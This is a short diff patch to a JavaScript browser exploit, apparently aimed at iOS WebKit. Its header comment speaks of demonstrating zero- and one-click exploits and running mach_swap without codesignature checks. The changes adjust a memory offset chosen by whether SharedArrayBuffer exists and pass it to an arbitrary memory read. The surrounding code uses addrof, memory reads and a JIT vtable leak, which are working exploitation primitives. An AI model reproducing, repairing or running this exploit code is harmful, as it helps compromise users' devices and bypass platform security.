@@ -8,8 +8,7 @@
  * It is under no circumstance justified to alter or reuse the code for the harm of innocent users or counter-intelligence.
  * The purpose of this exploit is to demonstrate the impact of zero- and one-click exploits and to run mach_swap without any codesignature requirements.
 */
-var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
-var FPO = spectre ? 0x18 : 0x10;
+var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
 var VM_PROT_NONE = 0x0
 var VM_PROT_READ = 0x1
 var VM_PROT_WRITE = 0x2
@@ -530,7 +529,7 @@ function exploit(){
         let ad_div = addrof(d);
         log('[+] Address of the div is '+ad_div.toString(16));
         alert(FPO)
-        let exe_ptr = memory.read_i64(Add(ad_div, new Int64('0x18')),0);
+        let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
         log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr,0);
         log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
